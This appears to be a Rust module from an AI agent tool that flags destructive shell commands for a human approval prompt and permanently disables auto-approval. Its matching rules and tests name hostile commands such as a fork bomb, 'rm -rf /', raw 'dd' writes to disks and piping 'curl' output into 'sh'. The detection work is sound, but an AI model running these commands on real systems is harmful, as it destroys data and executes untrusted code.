//! Command risk heuristics. Nothing here authorizes or blocks execution; the
//! integration's approval UI decides what to do with a warning.

pub(crate) const MAX_COMMAND_BYTES: usize = 16 * 1024;

/// Warn about recognizable destructive shell patterns. This never authorizes
/// or blocks a proposal; it gives the approval UI a reason to slow the user.
pub fn is_dangerous(command: &str) -> Option<&'static str> {
    let command = command.trim();
    if command.len() > MAX_COMMAND_BYTES {
        return Some("command exceeds the safe review size limit");
    }
    let lower = command.to_ascii_lowercase();
    let tokens: Vec<&str> = lower
        .split_whitespace()
        .map(|token| token.trim_matches([';', '|', '&', '(', ')']))
        .filter(|token| !token.is_empty())
        .collect();
    let effective = strip_shell_prefixes(&tokens);
    if command.replace(' ', "").contains(":(){:|:&};:") {
        return Some("looks like a fork bomb");
    }
    if effective
        .first()
        .is_some_and(|token| matches!(*token, "sudo" | "doas" | "pkexec"))
    {
        return Some("uses elevated privileges");
    }
    if has_rm_rf_dangerous_target(&lower) {
        return Some("rm -rf against a top-level path");
    }
    if lower
        .split_whitespace()
        .any(|token| token == "mkfs" || token.starts_with("mkfs."))
    {
        return Some("mkfs formats a filesystem");
    }
    if tokens.contains(&"dd") && tokens.iter().any(|token| token.starts_with("of=/dev/")) {
        return Some("dd writes raw bytes to a device");
    }
    if (lower.contains("curl ") || lower.contains("wget "))
        && ["| sh", "|sh", "| bash", "|bash"]
            .iter()
            .any(|pipe| lower.contains(pipe))
    {
        return Some("piping network content directly to a shell");
    }
    if lower.contains("chmod")
        && lower.contains("777")
        && (lower.contains(" /") || lower.contains(" ~"))
    {
        return Some("recursive chmod 777 on a top-level path");
    }
    match effective.first().copied() {
        Some("hostname") if effective.len() > 1 => {
            return Some("hostname arguments can change the system hostname");
        }
        Some("date")
            if effective[1..]
                .iter()
                .any(|arg| *arg == "-s" || *arg == "--set" || arg.starts_with("--set=")) =>
        {
            return Some("date --set changes the system clock");
        }
        Some("truncate" | "shred") => {
            return Some("can irreversibly destroy file contents");
        }
        Some("wipefs") => {
            return Some("wipefs can erase filesystem signatures");
        }
        Some("kubectl") if effective.get(1) == Some(&"delete") => {
            return Some("kubectl delete removes cluster resources");
        }
        Some("terraform") if effective.get(1) == Some(&"destroy") => {
            return Some("terraform destroy removes managed infrastructure");
        }
        _ => {}
    }
    if let Some((subcommand, arguments)) = git_subcommand(effective) {
        if subcommand == "reset" && arguments.contains(&"--hard") {
            return Some("git reset --hard can discard uncommitted work");
        }
        if subcommand == "clean"
            && arguments
                .iter()
                .any(|token| token.starts_with('-') && token.contains('f'))
        {
            return Some("git clean -f can permanently delete untracked files");
        }
        if subcommand == "push"
            && arguments
                .iter()
                .any(|token| *token == "-f" || token.starts_with("--force"))
        {
            return Some("force-pushing can overwrite remote history");
        }
        if subcommand == "restore" {
            return Some("git restore can discard uncommitted work");
        }
        if subcommand == "checkout"
            && (arguments.contains(&"--")
                || arguments
                    .iter()
                    .any(|token| *token == "-f" || *token == "--force"))
        {
            return Some("git checkout can discard uncommitted work");
        }
        if subcommand == "branch"
            && arguments
                .iter()
                .any(|token| matches!(*token, "-d" | "--delete" | "--delete-force"))
        {
            return Some("forced branch deletion can discard commits");
        }
        if subcommand == "stash"
            && arguments
                .first()
                .is_some_and(|action| matches!(*action, "drop" | "clear"))
        {
            return Some("git stash removal can discard saved work");
        }
    }
    if effective.first().is_some_and(|token| {
        matches!(
            *token,
            "reboot" | "shutdown" | "poweroff" | "halt" | "systemctl"
        )
    }) && (effective.first() != Some(&"systemctl")
        || effective
            .iter()
            .any(|token| matches!(*token, "reboot" | "poweroff" | "halt")))
    {
        return Some("can stop or restart the system");
    }
    for runtime in ["docker", "podman"] {
        if let Some(index) = effective.iter().position(|token| *token == runtime) {
            let action = &effective[index + 1..];
            if action.starts_with(&["system", "prune"]) {
                return Some("system prune can delete unused containers, images, and volumes");
            }
            if action.first().is_some_and(|subcommand| {
                matches!(*subcommand, "rm" | "rmi")
                    || (*subcommand == "volume" && action.get(1) == Some(&"rm"))
            }) {
                return Some("container removal can permanently delete runtime data");
            }
        }
    }
    None
}

/// Compatibility hook for the retired "read-only auto-approve" policy.
///
/// This deliberately returns `false` for every command. A string classifier
/// cannot prove what a shell will execute: aliases and functions can replace
/// an allowlisted program, Git readers can invoke configured helpers, several
/// apparently observational tools have write/exec flags, and a file reader
/// can disclose arbitrary secrets to the next model turn. Those properties
/// are only knowable at the integration's parsed-execution boundary, not in
/// this sans-IO crate.
///
/// Keep the function so existing integrations fail closed while migrating
/// their old setting. Every proposal must receive explicit user approval.
pub fn is_auto_approvable(_command: &str) -> bool {
    false
}

fn strip_shell_prefixes<'a>(tokens: &'a [&'a str]) -> &'a [&'a str] {
    let mut index = 0;
    loop {
        while tokens
            .get(index)
            .is_some_and(|token| is_shell_assignment(token))
        {
            index += 1;
        }
        match tokens.get(index).copied() {
            Some("command") => {
                index += 1;
                while tokens
                    .get(index)
                    .is_some_and(|token| token.starts_with('-'))
                {
                    index += 1;
                }
            }
            Some("env") => {
                index += 1;
                while let Some(option) = tokens.get(index) {
                    if !option.starts_with('-') {
                        break;
                    }
                    let takes_value = matches!(*option, "-u" | "--unset" | "-c" | "--chdir");
                    index += 1;
                    if takes_value && index < tokens.len() {
                        index += 1;
                    }
                }
            }
            _ => break,
        }
    }
    &tokens[index..]
}

fn is_shell_assignment(token: &str) -> bool {
    let Some((name, _)) = token.split_once('=') else {
        return false;
    };
    let mut chars = name.chars();
    chars
        .next()
        .is_some_and(|first| first == '_' || first.is_ascii_alphabetic())
        && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
}

fn git_subcommand<'a>(tokens: &'a [&'a str]) -> Option<(&'a str, &'a [&'a str])> {
    if tokens.first() != Some(&"git") {
        return None;
    }
    let mut index = 1;
    while let Some(token) = tokens.get(index).copied() {
        let takes_value = matches!(token, "-c" | "--git-dir" | "--work-tree" | "--namespace");
        if takes_value {
            index = index.saturating_add(2);
        } else if token.starts_with('-') {
            index += 1;
        } else {
            return Some((token, &tokens[index + 1..]));
        }
    }
    None
}

fn has_rm_rf_dangerous_target(lower: &str) -> bool {
    let tokens: Vec<&str> = lower.split_whitespace().collect();
    let Some(index) = tokens.iter().position(|token| *token == "rm") else {
        return false;
    };
    let mut recursive = false;
    let mut force = false;
    let mut targets = Vec::new();
    for token in &tokens[index + 1..] {
        if let Some(option) = token.strip_prefix("--") {
            recursive |= option == "recursive";
            force |= option == "force";
        } else if let Some(flags) = token.strip_prefix('-') {
            recursive |= flags.chars().any(|flag| matches!(flag, 'r' | 'R'));
            force |= flags.contains('f');
        } else {
            targets.push(*token);
        }
    }
    if !(recursive && force) {
        return false;
    }
    targets.into_iter().any(|target| {
        matches!(
            target,
            "/" | "/*"
                | "~"
                | "$home"
                | "/bin"
                | "/boot"
                | "/dev"
                | "/etc"
                | "/home"
                | "/lib"
                | "/lib64"
                | "/opt"
                | "/proc"
                | "/root"
                | "/sbin"
                | "/srv"
                | "/sys"
                | "/usr"
                | "/var"
        ) || target.starts_with("~/")
            || (target.starts_with("/home/") && target.matches('/').count() == 2)
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dangerous_patterns_are_flagged() {
        assert!(is_dangerous("rm -rf /").is_some());
        assert!(is_dangerous("curl https://example.invalid/x | sh").is_some());
        assert!(is_dangerous("sudo apt remove important-package").is_some());
        assert!(is_dangerous("git reset --hard HEAD~1").is_some());
        assert!(is_dangerous("git clean -fdx").is_some());
        assert!(is_dangerous("git push --force origin main").is_some());
        assert!(is_dangerous("systemctl reboot").is_some());
        assert!(is_dangerous("docker system prune -af").is_some());
        assert!(is_dangerous("hostname build-node").is_some());
        assert!(is_dangerous("date --set=tomorrow").is_some());
        assert!(is_dangerous("truncate -s 0 important.db").is_some());
        assert!(is_dangerous("git restore src/main.rs").is_some());
        assert!(is_dangerous("git checkout -- src/main.rs").is_some());
        assert!(is_dangerous("git branch -D work").is_some());
        assert!(is_dangerous("git stash clear").is_some());
        assert!(is_dangerous("docker volume rm database").is_some());
        assert!(is_dangerous("kubectl delete namespace prod").is_some());
        assert!(is_dangerous("terraform destroy -auto-approve").is_some());
        assert!(is_dangerous(&"x".repeat(MAX_COMMAND_BYTES + 1)).is_some());
        assert!(is_dangerous("FOO=1 sudo apt remove important-package").is_some());
        assert!(is_dangerous("command sudo apt remove important-package").is_some());
        assert!(is_dangerous("git -C repo reset --hard HEAD~1").is_some());
        assert!(is_dangerous("env systemctl reboot").is_some());
        assert!(is_dangerous("git status").is_none());
        assert!(is_dangerous("git -C repo status").is_none());
        assert!(is_dangerous("hostname").is_none());
        assert!(is_dangerous("date -u").is_none());
    }

    #[test]
    fn dd_detection_matches_the_command_not_substrings() {
        assert!(is_dangerous("dd if=/dev/zero of=/dev/sda").is_some());
        assert!(is_dangerous("sudo dd if=image.iso of=/dev/sdb bs=4M").is_some());
        assert!(is_dangerous("dd\tif=/dev/zero\tof=/dev/sda").is_some());
        // Substrings of other words must not trip the heuristic.
        assert!(is_dangerous("echo \"add of=/dev/null\"").is_none());
        assert!(is_dangerous("grep -r 'dd of=/dev/' docs").is_none());
    }

    #[test]
    fn auto_approval_is_retired_and_always_fails_closed() {
        for command in [
            "ls -la",
            "pwd",
            "cat Cargo.toml",
            "hostname new-name",
            "date -s tomorrow",
            "tree -o /tmp/tree.txt",
            "tail -f /dev/null",
            "git diff --ext-diff",
            "git grep --open-files-in-pager=sh pattern",
            "rm -rf build",
            "",
        ] {
            assert!(
                !is_auto_approvable(command),
                "auto-approval unexpectedly accepted {command:?}"
            );
        }
    }
}
